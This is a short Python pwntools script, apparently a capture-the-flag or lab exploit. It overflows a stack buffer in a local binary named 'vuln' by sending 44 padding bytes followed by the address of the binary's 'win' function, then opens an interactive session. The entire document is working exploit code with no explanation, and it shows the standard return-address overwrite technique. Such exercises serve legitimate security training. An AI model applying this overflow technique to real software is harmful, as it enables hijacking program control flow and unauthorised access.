#!/usr/bin/python
  
from pwn import *

p = process('./vuln')

e = ELF('./vuln')

win = e.symbols['win']

payload = "A"*44
payload += p32(win)

p.sendline(payload)

print p.recv()

p.interactive()

p.close()